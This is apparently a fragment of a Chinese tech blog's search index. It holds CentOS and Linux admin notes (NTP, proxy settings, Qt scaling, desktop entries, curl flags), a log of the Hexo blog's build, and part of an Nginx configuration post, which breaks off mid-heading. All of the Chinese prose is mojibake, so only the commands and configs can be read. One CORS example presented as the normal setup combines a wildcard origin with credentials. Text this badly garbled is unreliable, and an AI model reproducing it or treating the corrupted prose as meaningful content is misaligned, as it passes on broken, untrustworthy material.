ç”±äºCentos7é»˜è®¤ä½¿ç”¨chronydæ¥åŒæ­¥æ—¶é—´ï¼Œå¦‚æœéœ€è¦å®‰è£…å…¶ä»–æ—¶é—´åŒæ­¥æœåŠ¡ï¼ˆntpdï¼‰ï¼Œåˆ™éœ€è¦ç¦ç”¨chronyd# systemctl disable chronyd# å®‰è£…ntpæœåŠ¡# yum install ntp# ä½¿ç”¨ntpæ‰‹åŠ¨åŒæ­¥æ—¶é—´# ntpdate pool.ntp.org# å¼€æœºå¯åŠ¨ntpæœåŠ¡# systemctl enable ntpd# å¯åŠ¨ntpæœåŠ¡# systemctl start ntpd# é‡å¯ntpæœåŠ¡# systemctl restart ntpd# æŸ¥çœ‹ntpæœåŠ¡çš„è¿è¡ŒçŠ¶æ€# systemctl status ntpd# è®¾ç½®äºšæ´²æ—¶åŒº# timedatectl set-timezone Asia/Shanghai# å¯ç”¨ntpåŒæ­¥# timedatectl set-ntp yes# æŸ¥çœ‹å½“å‰ç³»ç»Ÿæ—¶é—´ã€æ—¶é—´åŒæ­¥çŠ¶æ€# timedatectl status# æŸ¥çœ‹æ—¶é—´åŒæ­¥æœåŠ¡å™¨åˆ—è¡¨# ntpq -p JVM è®¾ç½®ä»£ç† 1234567# ä¸æ”¯æŒSocketä»£ç†ï¼Œåªæ”¯æŒHttpä»£ç†-Dhttp.proxyPort=8118-Dhttp.proxyHost=127.0.0.1-Dhttps.proxyPort=8118-Dhttps.proxyHost=127.0.0.1-Dhttp.nonProxyHosts="localhost|127.0.0.1|*.aliyun.com" Centos7 è°ƒèŠ‚å±å¹•äº®åº¦ 12345# å®‰è£…xgamma# yum install xgamma# è°ƒèŠ‚è°ƒåº¦ï¼Œå…¶ä¸­ 0.1 &lt; n &lt; 10.0# xgamma -gamma n è§£å†³ Centos çš„ Qt æ¡Œé¢åº”ç”¨ç¨‹åºæ— æ³•æ­£å¸¸è¿è¡Œçš„é—®é¢˜ 123456789101112131415# å…·ä½“è¡¨ç°ä¸ºåº”ç”¨çš„ç•Œé¢æ— æ³•æ­£å¸¸æ˜¾ç¤ºï¼ˆç™½å± + ç•Œé¢è¿‡åº¦æ‹‰ä¼¸ï¼‰ï¼Œä¸€èˆ¬æ˜¯Qtå¯¹é«˜DPIæ˜¾ç¤ºå™¨çš„é…ç½®å‡ºäº†é—®é¢˜# æ·»åŠ ç¯å¢ƒå˜é‡# vim /etc/profileexport QT_AUTO_SCREEN_SCALE_FACTOR=0# ä½¿ç¯å¢ƒå˜é‡ç”Ÿæ•ˆ# source /etc/profile# å¦‚æœåº”ç”¨æ˜¯åœ¨ZSH Shellç¯å¢ƒä¸‹ä½¿ç”¨å‘½ä»¤å¯åŠ¨ï¼Œåˆ™éœ€è¦åœ¨ZSHçš„é…ç½®æ–‡ä»¶ä¸­æ·»åŠ ç¯å¢ƒå˜é‡ï¼ˆåŒºåˆ†ä¸åŒçš„Linuxç”¨æˆ·ï¼‰# vim ~/.zshrcexport QT_AUTO_SCREEN_SCALE_FACTOR=0# ä½¿ZSHé…ç½®æ–‡ä»¶ç”Ÿæ•ˆï¼ˆåŒºåˆ†ä¸åŒçš„Linuxç”¨æˆ·ï¼‰# source ~/.zshrc Centos7 çš„åº”ç”¨å¿«æ·æ–¹å¼æŒ‡å®šç¯å¢ƒå˜é‡ 1234567891011121314151617181920212223242526272829# é…ç½®ç¤ºä¾‹ï¼Œåœ¨å¿«æ·æ–¹å¼æ–‡ä»¶é‡ŒæŒ‡å®šç¯å¢ƒå˜é‡ï¼šQT_AUTO_SCREEN_SCALE_FACTOR=0# æ–¹æ³•ä¸€[Desktop Entry]Version=1.0Name=Redis Desktop ManagerComment=Redis Desktop ManagerType=ApplicationCategories=Development;Exec=env QT_AUTO_SCREEN_SCALE_FACTOR=0 /snap/bin/redis-desktop-manager.rdm %UTerminal=falseStartupNotify=trueIcon=/var/lib/snapd/snap/redis-desktop-manager/current/usr/share/pixmaps/rdm.png# æ–¹æ³•äºŒ[Desktop Entry]Version=1.0Name=Redis Desktop ManagerComment=Redis Desktop ManagerType=ApplicationCategories=Development;Exec=bash -c "export QT_AUTO_SCREEN_SCALE_FACTOR=0 &amp;&amp; /usr/bin/vlc --started-from-file %U"Terminal=falseStartupNotify=trueIcon=/var/lib/snapd/snap/redis-desktop-manager/current/usr/share/pixmaps/rdm.png# å‚è€ƒåšå®¢# https://askubuntu.com/questions/144968/set-variable-in-desktop-file# https://askubuntu.com/questions/542152/desktop-file-with-bashrc-environment Centos7 çš„åº”ç”¨å¿«æ·æ–¹å¼ä½¿ç”¨ Root æƒé™å¯åŠ¨ 123456789101112# ä»¥ä¸‹æ–¹æ³•ä½¿ç”¨äº†gksu-polkitï¼Œç›®å‰å­˜åœ¨æ— æ³•é€šè¿‡UIç•Œé¢å…³é—­åº”ç”¨çš„Bugï¼ˆå³ç‚¹å‡»ç•Œé¢ä¸Šçš„å…³é—­æŒ‰é’®ï¼Œåº”ç”¨è¿›ç¨‹ä¸ä¼šè¢«æ€æ­»ï¼‰[Desktop Entry]Version=4.6.2Encoding = UTF-8Type=ApplicationName=eclipse-neonIcon=/usr/local/eclipse-neon/icon.xpmExec=gksu-polkit /usr/local/eclipse-neon/eclipseComment=JEE IDECategories=Development;IDE;Terminal=false Centos7 å¿«æ·æ–¹å¼çš„ä½ç½® 123456# å…¨å±€çš„åº”ç”¨ç¨‹åºå¿«æ·æ–¹å¼/usr/share/applications//usr/local/share/applications/# ç‰¹å®šç”¨æˆ·çš„åº”ç”¨ç¨‹åºå¿«æ·æ–¹å¼~/.local/share/applications/ Linux ç£ç›˜åˆ†åŒºçš„ç©ºé—´ä¸è¶³ 1234567891. å¯ä»¥å°è¯•ä½¿ç”¨Gpartedç­‰å·¥å…·è¿›è¡Œåˆ†åŒºæ‰©å®¹ï¼Œä½†ä¸å»ºè®®è¿™ä¹ˆåšï¼Œå› ä¸ºå®¹æ˜“ç ´åç¡¬ç›˜çš„åˆ†åŒºè¡¨ï¼Œå¯¼è‡´æ•°æ®ä¸¢å¤±æˆ–è€…é€ æˆç³»ç»Ÿæ— æ³•æ­£å¸¸å¯åŠ¨ã€‚2. å»ºè®®å°†åˆ†åŒºå†…ï¼ˆç£ç›˜ç©ºé—´ä¸è¶³ï¼‰ä½“ç§¯è¾ƒå¤§çš„ç›®å½•ç§»åŠ¨åˆ°å…¶ä»–åˆ†åŒºï¼ˆç£ç›˜ç©ºé—´å……è¶³ï¼‰ï¼Œç„¶ååœ¨åˆ†åŒºå†…ï¼ˆç£ç›˜ç©ºé—´ä¸è¶³ï¼‰åˆ›å»ºè½¯é“¾æ¥æˆ–è€…ä½¿ç”¨"mount --bind"çš„æ–¹æ³•ï¼ŒæŒ‡å‘æ–°ç›®å½•æ‰€åœ¨çš„è·¯å¾„ã€‚3. å‡è®¾å…¶ä»–åˆ†åŒºä¹Ÿæ²¡æœ‰å……è¶³çš„ç£ç›˜ç©ºé—´ï¼Œé‚£ä¹ˆæ­¤æ—¶åº”è¯¥æ–°å¢ç¡¬ç›˜å¹¶æŒ‚è½½åˆ°ç³»ç»Ÿä¸­ï¼Œç„¶åé€šè¿‡ä¸Šé¢ä»‹ç»çš„æ–¹æ³•å°†åˆ†åŒºå†…ï¼ˆç£ç›˜ç©ºé—´ä¸è¶³ï¼‰ä½“ç§¯è¾ƒå¤§çš„ç›®å½•ç§»åŠ¨åˆ°æ–°ç¡¬ç›˜çš„åˆ†åŒºå³å¯ã€‚æç¤ºï¼š1) åˆ‡è®°å¹¶éæ‰€æœ‰åº”ç”¨éƒ½æ”¯æŒåˆ›å»ºè½¯é“¾æ¥ï¼ˆln -sï¼‰çš„æ–¹æ³•ï¼Œå› ä¸ºåˆ›å»ºè½¯é“¾æ¥åæœ‰å¯èƒ½ä¼šå¯¼è‡´éƒ¨åˆ†åº”ç”¨æ— æ³•æ­£å¸¸è¿è¡Œï¼ˆä¾‹å¦‚snapdï¼‰ï¼Œå»ºè®®ç»Ÿä¸€ä½¿ç”¨"mount --bind"2) å‡è®¾é€šè¿‡Gpartedå·¥å…·è¿›è¡Œåˆ†åŒºæ‰©å®¹ï¼Œæ‰©å®¹ä¹‹åç³»ç»Ÿå¯ä»¥æ­£å¸¸å¯åŠ¨ï¼Œç£ç›˜åˆ†åŒºçš„å®¹é‡ä¹Ÿç¡®å®å¢åŠ äº†ï¼Œä½†è¿™ä¸€åˆ‡éƒ½ä¸èƒ½è¯´æ˜æ‰©å®¹æ“ä½œçœŸçš„æˆåŠŸäº†ã€‚å› ä¸ºè¿™ç±»æ“ä½œå¯èƒ½ä¼šç•™ä¸‹å…¶ä»–åæ‚£ï¼Œä¾‹å¦‚æ‰©å®¹åä½¿ç”¨"å†ç”Ÿé¾™"å¤‡ä»½ç¡¬ç›˜ä¸ºé•œåƒæ–‡ä»¶æ—¶ï¼Œä¼šå‡ºç°â€œæ— æ³•ä¿å­˜åˆ†åŒºâ€çš„é”™è¯¯ä¿¡æ¯ã€‚ Docker é…ç½®ä»£ç† 1234567891011121314151617# æ­¤æ–¹æ³•é€‚ç”¨äºDebian/Ubuntu/CentOSç³»ç»Ÿï¼Œä¿®æ”¹é…ç½®åä¼šæŒç»­ç”Ÿæ•ˆï¼Œå…¶ä¸­çš„é…ç½®å°†è¦†ç›–docker.serviceä¸­çš„é€‰é¡¹# åˆ›å»ºå­˜æ”¾é…ç½®æ–‡ä»¶çš„ç›®å½•# mkdir -p /etc/systemd/system/docker.service.d# æ–°å¢ä»£ç†é…ç½®æ–‡ä»¶# vim /etc/systemd/system/docker.service.d/http-proxy.conf[Service]Environment="HTTP_PROXY=http://192.168.1.122:1080" "HTTPS_PROXY=http://192.168.1.122:1080" "NO_PROXY=localhost,127.0.0.1,mirrors.aliyun.com"# é‡è½½é…ç½®# systemctl daemon-reload# é‡å¯DockeræœåŠ¡# systemctl restart docker# è‹¥å–æ¶ˆä»£ç†ï¼Œåªéœ€åˆ é™¤ä»£ç†é…ç½®æ–‡ä»¶ï¼Œå¹¶é‡è½½é…ç½®å’Œé‡å¯DockeræœåŠ¡å³å¯ CURL å‘½ä»¤ä½¿ç”¨ 1234567891011121314# è·³è¿‡Httpsè¯ä¹¦éªŒè¯ï¼ˆ-kï¼‰# curl -k https://example.com# å…è®¸è·Ÿéšé‡å®šå‘ï¼ˆ-Lï¼‰# curl -I -L http://example.com# æŒ‡å®šè¯·æ±‚æ–¹å¼ï¼ˆ-Xï¼‰# curl -X GET http://example.com# æŒ‡å®šç”¨æˆ·åå¯†ç ï¼ˆ-uï¼Œæ³¨æ„å¯†ç ä¼šè®°å½•åœ¨Bashçš„å†å²è®°å½•ä¸­ï¼‰# curl -u username:password http://example.com# æŒ‡å®šæ¥æºï¼ˆ--refererï¼‰# curl -v -I --referer http://source.com htttp://example.com var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"linux å¼€å‘éšç¬”"},{title:"Hexo åšå®¢æ­å»ºæ—¥å¿—",url:"/posts/fc2b1bbb.html",text:'2018-12-20ï¼ˆæˆªæ­¢ï¼‰ å®ç°åšå®¢åŠ å¯†é™åˆ¶è®¿é—® åŸºäºè°·æ­Œã€ç™¾åº¦çš„ SEO ä¼˜åŒ– æ·»åŠ  404 é¡µé¢ã€åšå®¢ç‰ˆæƒå£°æ˜ åšå®¢ä½¿ç”¨å”¯ä¸€çš„çŸ­å­—ç¬¦ä¸²ä½œä¸ºé“¾æ¥åœ°å€ï¼ˆURLï¼‰ æ˜¾ç¤ºç«™ç‚¹çš„æ€»è®¿é—®é‡ã€æ¯ç¯‡åšå®¢çš„é˜…è¯»é‡ç»Ÿè®¡ä¸å­—æ•°ç»Ÿè®¡ åŸºäº Linux + Gitolite + GitHooks + Shell è„šæœ¬è‡ªä¸»å®ç° Hexo çš„æŒç»­éƒ¨ç½²ä¸åšå®¢å¤‡ä»½ . . . . . . 2018-12-28 æ˜¾ç¤ºç«™ç‚¹çš„æ€»è¿è¡Œæ—¶é—´ æ·»åŠ  PDF æ–‡ä»¶åœ¨çº¿æ˜¾ç¤ºæ’ä»¶ Web æœåŠ¡å™¨é…ç½®è·¨åŸŸã€GZIP å‹ç¼©ã€Web é™æ€èµ„æºçš„æµè§ˆå™¨ç«¯ç¼“å­˜ 2019-01-28 æ·»åŠ ä»£ç å—æŠ˜å æ’ä»¶ 2019-02-11 PC ç«¯çš„é¡µé¢æ–°å¢ APlayer éŸ³ä¹æ’­æ”¾å™¨ æ·»åŠ  hexo-generator-sitemap æ’ä»¶ï¼ˆæ›´æ”¹æºç ï¼‰ï¼Œä½¿ç”Ÿæˆçš„ç«™ç‚¹åœ°å›¾å¿½ç•¥ JSON æ–‡ä»¶çš„ URL å¸è½½å®˜æ–¹çš„ hexo-generator-index æ’ä»¶ï¼Œæ·»åŠ  hexo-generator-index2 æ’ä»¶ï¼ˆæ›´æ”¹æºç ï¼‰ï¼Œå®ç°é¦–é¡µéšè—æŒ‡å®šæ–‡ç«  2019-02-24 æ·»åŠ  Google Analytics çš„ç»Ÿè®¡ä»£ç  å®Œå–„è°·æ­Œçš„ SEO ä¼˜åŒ–ï¼ˆæ•´åˆé‡å¤ç½‘å€ã€è§„èŒƒç½‘é¡µï¼‰ æ·»åŠ  hexo-autonofollow æ’ä»¶ï¼ˆæ›´æ”¹æºç ï¼‰ï¼Œä¸ºåšå®¢ä¸­çš„å¤–é“¾è‡ªåŠ¨åŠ ä¸Š nofollow å±æ€§ 2019-03-03 æ•´ç† Hexo çš„æ’ä»¶ä¾èµ–ï¼Œå°†ä»¥å‰æ›´æ”¹è¿‡ä»£ç çš„å¼€æºæ’ä»¶å’Œè‡ªä¸»å¼€å‘çš„æ’ä»¶ç»Ÿä¸€æ‰“åŒ…ä¸ºè‡ªå®šä¹‰æ’ä»¶ï¼Œå¹¶å‘å¸ƒåˆ° NPM ä»“åº“ï¼Œè‡ªå®šä¹‰æ’ä»¶åˆ—è¡¨å¦‚ä¸‹ï¼š â˜…å±•å¼€è‡ªå®šä¹‰æ’ä»¶åˆ—è¡¨ä¸€â˜… 12345678910111213hexo-readmorehexo-ssl-authhexo-site-authhexo-yilia-foldhexo-pdf-betterhexo-waline-nexthexo-pangu-betterhexo-next-darkmodehexo-google-adsensehexo-tipue-search-dbhexo-admonition-betterhexo-lazyload-image-betterhexo-generator-sogou-sitemap â˜…å±•å¼€è‡ªå®šä¹‰æ’ä»¶åˆ—è¡¨äºŒâ˜… 1234567hexo-toc-customizedhexo-dplayer-customizedhexo-blog-encrypt-customizedhexo-autonofollow-customizedhexo-generator-index2-customizedhexo-generator-sitemap-customizedhexo-generator-json-content-customized 2019-03-05 404 é¡µé¢æ”¹ç‰ˆ ä½¿ç”¨ Gulp è‡ªå®šä¹‰è„šæœ¬å‹ç¼© CSSã€JSã€HTMLã€å›¾ç‰‡æ–‡ä»¶ï¼Œå¹¶å°† Gulp å‹ç¼©é›†æˆåˆ° Hexo çš„æŒç»­éƒ¨ç½²æµç¨‹ä¸­ æ›´æ”¹ Hexo ä¸»é¢˜ Yilia çš„æºç ï¼Œå¹¶é€šè¿‡ Webpack é‡æ–°æ„å»ºç¼–è¯‘ï¼Œå®ç°æœ‰åºçš„æ ‡ç­¾åˆ—è¡¨ã€ä¼˜åŒ–ä¸»é¢˜çš„æ˜¾ç¤ºç»†èŠ‚ 2019-03-13 å°† Web æœåŠ¡å™¨éƒ¨ç½²åˆ° Docker å®¹å™¨å†… Web æœåŠ¡è¿ç§»è‡³ Tencent Cloudï¼Œæ›´æ¢ç«™ç‚¹åŸŸå æ·»åŠ  DPlayer è§†é¢‘æ’­æ”¾æ’ä»¶ï¼ˆæ›´æ”¹æºç ï¼‰ï¼Œé»˜è®¤æ”¯æŒæ’­æ”¾çš„è§†é¢‘æ ¼å¼åŒ…æ‹¬ï¼šmp4ã€flvã€m3u8 2019-03-19 å®ç°å…¨ç«™ HTTPS åŒ– å®Œæˆç«™ç‚¹é¡µé¢æ”¹é€ ï¼Œå…¨é¢æ¥å…¥ç™¾åº¦ç†ŠæŒ ID å®Œæˆç«™ç‚¹å¤‡æ¡ˆï¼Œå¹¶åœ¨ç«™ç‚¹çš„é¡µé¢åº•éƒ¨æ·»åŠ å¤‡æ¡ˆå· 2019-03-20 æ·»åŠ ç½‘é¡µåŠ è½½è¿›åº¦æ¡ æ·»åŠ æ˜¾ç¤ºæ–‡ç« ç›®å½•çš„æ’ä»¶ï¼ˆhexo-toc-customizedï¼‰ 2019-09-28 åŸºäº Utterance æ–°å¢åšå®¢è¯„è®ºåŠŸèƒ½ 2019-09-30 æ¥å…¥å¾®ä¿¡å…¬ä¼—å·çš„ JS-SDKï¼Œå®ç°å¾®ä¿¡åˆ†äº«åšå®¢é“¾æ¥æ—¶æ˜¾ç¤ºç¼©ç•¥å›¾ç‰‡çš„åŠŸèƒ½ 2020-01-04 ä¼˜åŒ–ç§»åŠ¨ç«¯çš„é¡µé¢ï¼Œæ–‡ç« è¯¦æƒ…é¡µé¢ä¸å†æ˜¾ç¤ºå‘å¸ƒæ—¥æœŸã€å­—æ•°ç»Ÿè®¡ã€é˜…è¯»é‡ç»Ÿè®¡ åœ¨åšå®¢ä¸»é¢˜çš„æ¨¡æ¿ä¸­æ–°å¢è°·æ­Œå¹¿å‘Šä»£ç ï¼Œå¹¿å‘Šçš„å›ºå®šä½ç½®åˆ†åˆ«æ˜¯é¡µé¢å·¦ä¾§çš„èœå•æ ï¼ˆé€‚ç”¨äº PC ç«¯ï¼‰ã€æ¯ç¯‡æ–‡ç« çš„åº•éƒ¨ï¼ˆé€‚ç”¨äº PC ç«¯ + ç§»åŠ¨ç«¯ï¼‰ æ–°å¢ Hexo è°·æ­Œå¹¿å‘Šæ’ä»¶ï¼ˆhexo-google-adsenseï¼‰ï¼Œæ”¯æŒä½¿ç”¨ Hexo è‡ªå®šä¹‰æ ‡ç­¾åœ¨æŒ‡å®šçš„æ–‡ç« ä¸­ä»»ä½•åœ°æ–¹åŠ¨æ€æ’å…¥è°·æ­Œå¹¿å‘Šä»£ç ï¼ˆé€‚ç”¨äº PC ç«¯ + ç§»åŠ¨ç«¯ï¼‰ 2020-01-08 æ–°å¢ RSS è®¢é˜…åŠŸèƒ½ åŸºäºæœç‹—æœç´¢å¼•æ“çš„ SEO ä¼˜åŒ– æ–°å¢è‡ªåŠ¨ç”Ÿæˆæœç‹—ç«™ç‚¹åœ°å›¾çš„ Hexo æ’ä»¶ï¼ˆhexo-generator-sogou-sitemapï¼‰ 2020-01-14 PC ç«¯æ–°å¢ç«™å†…å…¨æ–‡é™æ€æœç´¢åŠŸèƒ½ æ·»åŠ å›¾ç‰‡æ‡’åŠ è½½æ’ä»¶ï¼ˆhexo-lazyload-image-betterï¼‰ 2020-03-28 åŸºäºå¿…åº”æœç´¢å¼•æ“çš„ SEO ä¼˜åŒ– 2020-04-15 å®ç° Hexo çš„å¤šçº¿éƒ¨ç½²ï¼Œä½¿ç”¨ Coding Pagesã€GitHub Pages æ¥åŠ å¿«å›½å†…å¤–è®¿é—®åšå®¢çš„é€Ÿåº¦ 2021-01-25 åŸºäºè‡ªå®šä¹‰æ’ä»¶ï¼ˆhexo-pangu-customizedï¼‰ï¼Œåœ¨ HTML æ–‡ä»¶é‡Œçš„ä¸­æ–‡å­—ç¬¦å’Œè‹±æ–‡å­—ç¬¦ä¹‹é—´è‡ªåŠ¨æ·»åŠ ç©ºæ ¼ç¬¦ï¼ˆMarkDown ä»£ç å—é™¤å¤–ï¼‰ åŸºäºè‡ªå®šä¹‰æ’ä»¶ï¼ˆhexo-generator-json-content-customizedï¼‰ï¼Œæ”¯æŒåœ¨ Yilia ä¸»é¢˜çš„æœç´¢å·¥å…·é‡Œä½¿ç”¨æ ‡é¢˜æ¥æœç´¢åšå®¢æ—¶ï¼Œé»˜è®¤ä¸å†éšè—å·²åŠ å¯†çš„åšå®¢ï¼ˆPostsï¼‰ 2021-04-12 å‡çº§ Gulp çš„ç‰ˆæœ¬è‡³ 4.0.2 å‡çº§ Hexo çš„ç‰ˆæœ¬è‡³ 5.4.0 å–æ¶ˆ Coding Pages çš„å¤šçº¿éƒ¨ç½² å°†åšå®¢é»˜è®¤çš„ä¸»é¢˜è¿ç§»è‡³ NexTï¼ŒåŒæ—¶ä¿ç•™å¹¶å…¼å®¹æ—§ä¸»é¢˜ Yilia åœ¨ NexT ä¸»é¢˜çš„åŸºç¡€ä¸Šï¼ŒåŸºäº Docker æ–°å¢ Waline è¯„è®ºç³»ç»Ÿçš„å‰åç«¯æ”¯æŒ 2021-04-29 åŸºäºè‡ªå®šä¹‰æ’ä»¶ï¼ˆhexo-next-darkmodeï¼‰ï¼Œæ–°å¢å¯åˆ‡æ¢çš„æš—é»‘æ¨¡å¼ 2021-06-12 åŸºäºè‡ªå®šä¹‰æ’ä»¶ï¼ˆhexo-waline-nextï¼‰ï¼Œæ”¯æŒ Waline å®¢æˆ·ç«¯å°†è¯„è®ºå›¾ç‰‡ä¸Šä¼ åˆ°ä¸ƒç‰›å›¾åºŠ 2022-01-17 åŸºäºè‡ªå®šä¹‰æ’ä»¶ï¼ˆhexo-readmoreï¼‰ï¼Œè®©ç”¨æˆ·æ‰«ç å…³æ³¨å¾®ä¿¡å…¬ä¼—å·åæ‰å¯ä»¥è§£é”æ–‡ç«  2022-02-24 å…¨ç«™ç¦ç”¨ CDN èµ„æºï¼ˆä»…é™äº JSã€CSS èµ„æºï¼‰ï¼Œç»Ÿä¸€ä½¿ç”¨ç«™å†…çš„ Web èµ„æºæ–‡ä»¶ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"é™æ€åšå®¢"},{title:"Nginx å¸¸ç”¨é…ç½®",url:"/posts/30985643.html",text:'é…ç½®è·¨åŸŸä¸‹è¿°çš„ add_header æœ«å°¾éƒ½å¯ä»¥åŠ ä¸Šäº† alwaysï¼Œå®ƒè¡¨ç¤ºä¸ç®¡ HTTP è¿”å›çŠ¶æ€ç æ˜¯å¤šå°‘éƒ½ä¼šä½¿ add_header ç”Ÿæ•ˆï¼Œæœ‰äº›æ—¶å€™æœåŠ¡ç«¯å¯èƒ½ä¼šè¿”å› 4XX çš„ HTTP çŠ¶æ€ç ï¼Œè¿™æ—¶å€™å¦‚æœå°‘äº† always ä¼šå¯¼è‡´ add_header å¤±æ•ˆï¼Œä»è€Œå¯¼è‡´æµè§ˆå™¨æŠ¥è·¨åŸŸé”™è¯¯ã€‚ 123456789101112location / { add_header \'Access-Control-Allow-Origin\' \'*\' always; add_header \'Access-Control-Allow-Credentials\' \'true\' always; add_header \'Access-Control-Allow-Methods\' \'GET,HEAD,PUT,POST,DELETE,PATCH,OPTIONS\' always; add_header \'Access-Control-Allow-Headers\' \'Accept,Authorization,DNT,X-CustomHeader,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Origin\' always; if ($request_method = \'OPTIONS\') { return 204; } ...} æˆ–è€…ä½¿ç”¨é€šé…ç¬¦ï¼Œå…è®¸æ‰€æœ‰å¤´éƒ¨ã€æ‰€æœ‰åŸŸã€æ‰€æœ‰æ–¹æ³•è·¨åŸŸï¼Œå­˜åœ¨å®‰å…¨éšæ‚£ï¼ˆä¸æ¨èä½¿ç”¨ï¼‰ 123456789101112location / { add_header \'Access-Control-Allow-Origin\' \'*\' always; add_header \'Access-Control-Allow-Headers\' \'*\' always; add_header \'Access-Control-Allow-Methods\' \'*\' always; add_header \'Access-Control-Allow-Credentials\' \'true\' always; if ($request_method = \'OPTIONS\') { return 204; } ...} é€šè¿‡ CURL å‘½ä»¤æµ‹è¯•é…ç½®æ˜¯å¦ç”Ÿæ•ˆ 123456789101112131415$ curl -I http://www.example.com/slider.e37972.js# æµ‹è¯•ç»“æœHTTP/1.1 200 OKServer: Nginx/2.2.3Date: Tue, 25 Dec 2018 17:59:53 GMTContent-Type: application/javascriptContent-Length: 53386Last-Modified: Tue, 25 Dec 2018 17:56:47 GMTConnection: keep-aliveAccess-Control-Allow-Origin: *Access-Control-Allow-Credentials: trueAccess-Control-Allow-Methods: GET,HEAD,PUT,POST,DELETE,PATCH,OPTIONSAccess-Control-Allow-Headers: Accept,Authorization,DNT,X-CustomHeader,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,OriginAccept-Ranges: bytes åˆ é™¤æŒ‡å®šçš„ Hederç›¸å…³æŒ‡ä»¤ï¼š proxy_set_header is to set a request header add_header is to add header to response proxy_hide_header is to hide a response header å¦‚æœè¦æ›¿æ¢å“åº”ä¸­å·²ç»å­˜åœ¨çš„ Headerï¼Œä»…ä»…ä½¿ç”¨ add_header æ˜¯ä¸å¤Ÿçš„ï¼Œå› ä¸ºå®ƒå°†å †å å€¼ï¼ˆå †å æ¥è‡ªæœåŠ¡å™¨å’Œè‡ªå·±æ·»åŠ çš„ Headerï¼‰ï¼Œæ‰€ä»¥å¿…é¡»åˆ†ä¸¤æ­¥æ‰§è¡Œæ“ä½œï¼š åˆ é™¤ Headerï¼šproxy_hide_header Access-Control-Allow-Origin; æ·»åŠ è‡ªå®šä¹‰ Headerï¼šadd_header Access-Control-Allow-Origin "*" always; å‡è®¾éœ€è¦åˆ é™¤å“åº”ä¸­å·²å­˜åœ¨çš„è·¨åŸŸ Headerï¼Œç„¶åå¾€å“åº”ä¸­æ·»åŠ è‡ªå®šä¹‰çš„è·¨åŸŸ Headerï¼Œé…ç½®ç¤ºä¾‹å¦‚ä¸‹ï¼š 123456789101112131415161718location / { proxy_hide_header Access-Control-Allow-Origin; proxy_hide_header Access-Control-Allow-Methods; proxy_hide_header Access-Control-Allow-Headers; proxy_hide_header Access-Control-Allow-Credentials; add_header \'Access-Control-Allow-Origin\' \'*\' always; add_header \'Access-Control-Allow-Credentials\' \'true\' always; add_header \'Access-Control-Allow-Methods\' \'GET,HEAD,PUT,POST,DELETE,PATCH,OPTIONS\' always; add_header \'Access-Control-Allow-Headers\' \'Accept,Authorization,DNT,X-CustomHeader,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Origin\' always; proxy_pass http://example.com; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; proxy_set_header REMOTE-HOST $remote_addr;} é…ç½® GZip å‹ç¼©1234567891011http { gzip on; gzip_min_length 1k; gzip_buffers 4 16k; gzip_comp_level 3; gzip_vary off; gzip_disable "MSIE [1-6]\\."; gzip_types text/plain text/css text/xml text/javascript application/json application/x-javascript application/xml application/xml+rss application/javascript; ...} 1234567891011# é€šè¿‡curlå‘½ä»¤æµ‹è¯•é…ç½®æ˜¯å¦ç”Ÿæ•ˆ$ curl -I -H "Accept-Encoding: gzip, deflate" http://www.example.com/slider.e37972.js# æµ‹è¯•ç»“æœHTTP/1.1 200 OKServer: Nginx/2.2.3Date: Tue, 25 Dec 2018 17:54:06 GMTContent-Type: application/javascriptLast-Modified: Tue, 25 Dec 2018 17:52:31 GMTConnection: keep-aliveContent-Encoding: gzip Nginx åå‘ä»£ç†é…ç½®123456789101112131415161718192021http { upstream applications { server 192.168.68.43:8081 weight=1; server 192.168.68.45:8082 weight=1; } server { listen 80; server_name localhost; location / { proxy_pass http://applications; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Real-Port $remote_port; proxy_set_header REMOTE-HOST $remote_addr; proxy_set_header X-Forwarded-Proto $scheme; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; } }} é…ç½® Web é™æ€èµ„æºçš„æµè§ˆå™¨ç«¯ç¼“å­˜123456789101112131415161718192021server { root /home/wwwroot/hexo-blog; location ~ .*\\.(?:jpg|jpeg|gif|png|ico|cur|gz|svg|svgz|mp4|ogg|ogv|webm|eot|ttf|woff|woff2)$ { expires 7d; } location ~ .*\\.(?:js|css)$ { expires 7d; } location ~ .*\\.(?:htm|html)$ { # æ ¹æ®å…·ä½“çš„é¡¹ç›®ä¸šåŠ¡ï¼Œå†³å®šæ˜¯å¦éœ€è¦é…ç½®æµè§ˆå™¨ç«¯çš„é™æ€é¡µé¢ç¼“å­˜ï¼Œä»¥ä¸‹é…ç½®è¡¨ç¤ºæ˜¯ä¸ç¼“å­˜ä»»ä½•Htmlé¡µé¢ add_header Cache-Control "private, no-store, no-cache, must-revalidate, proxy-revalidate"; } ...} Nginx åˆ©ç”¨ Referer 